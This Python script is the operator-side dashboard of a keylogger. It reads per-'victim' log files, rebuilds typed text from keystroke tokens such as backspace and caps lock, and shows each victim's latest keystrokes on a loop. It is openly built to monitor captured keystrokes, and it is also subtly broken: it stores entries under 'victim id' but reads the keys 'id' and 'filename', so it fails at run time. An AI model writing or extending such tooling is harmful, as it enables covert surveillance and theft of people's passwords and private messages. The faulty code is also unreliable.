from pathlib import Path
import re
import time

LOG_DIR = Path("logs")
TOKEN_PATTERN = re.compile(r"\[(BS|TAB|DEL|SHIFT|CAPS)\]")
REFRESH_SECONDS = 1
TAB_SIZE = 4

def clear_screen():
    print("\033[2J\033[H", end="") # Erase the entire screen, Move the cursor to top left of screen

def apply_backspace(lines):
    if not lines:
        lines.append("")

    if lines[-1]: # Symbol for last line of text
        lines[-1] = lines[-1][:-1] # Cut off the last char
    elif len(lines) > 1: # If curr line empty, and there are more lines before, remove this/last line
        lines.pop()

def parse_log(raw_text):
    raw_text = raw_text.replace("\\[", "[") # \\ take actual "\" not the escape char
    raw_text = raw_text.replace("\\]", "]")

    lines = [""]
    caps_on = False
    pos = 0

    for match in TOKEN_PATTERN.finditer(raw_text): # Find all the tokens
        start, end = match.span() # returns the exact starting and ending index of the tag inside the string

        normal_text = raw_text[pos:start] # Helk[BS]lo --> Helk
        for ch in normal_text:
            if ch == "\n":
                lines.append("")
            else:
                if caps_on and ch.isalpha(): # Alphabet letter
                    ch = ch.upper()
                lines[-1] += ch

        token = match.group() # Extracts the actual string of the tag ([BS])

        if token == "[BS]":
            apply_backspace(lines)
        elif token == "[TAB]":
            lines[-1] += " " * TAB_SIZE
        elif token == "[DEL]":
            pass
        elif token == "[SHIFT]":
            pass
        elif token == "[CAPS]":
            caps_on = not caps_on

        pos = end # End of the tag

    remaining_text = raw_text[pos:] # Helk[BS]lo --> lo
    for ch in remaining_text:
        if ch == "\n":
            lines.append("")
        else:
            if caps_on and ch.isalpha():
                ch = ch.upper()
            lines[-1] += ch

    return "\n".join(lines) # Finished with this line and we glue it to the next like with \n


def read_all_logs():
    clients = []

    if not LOG_DIR.exists():
        return clients

    for log_file in sorted(LOG_DIR.glob("*.log")): # For every file and checks if the filename ends with .log
                                                   # glob generates an array: ["logs/victim1.log", "logs/victim2.log"]
        raw_text = log_file.read_text()
        parsed_text = parse_log(raw_text)

        clients.append({
            "victim id": log_file.stem, # .stem gets the filename
            "size": log_file.stat().st_size, # Size of the file in bytes
            "parsed_text": parsed_text
        })

    return clients


def show_dashboard(clients):
    clear_screen()
    print("--------- KEYLOGGER DASHBOARD ---------")
    print(f"Clients found: {len(clients)}")
    print()

    for client in clients:
        print("-" * 70)
        print(f"Victim ID: {client['id']}")
        print(f"File: {client['filename']} | Size: {client['size']} bytes")
        print("-" * 70)
        print(client["parsed_text"][-800:])
        print()


def main():
    while True:
        clients = read_all_logs()
        show_dashboard(clients)
        time.sleep(REFRESH_SECONDS)


if __name__ == "__main__":
    main()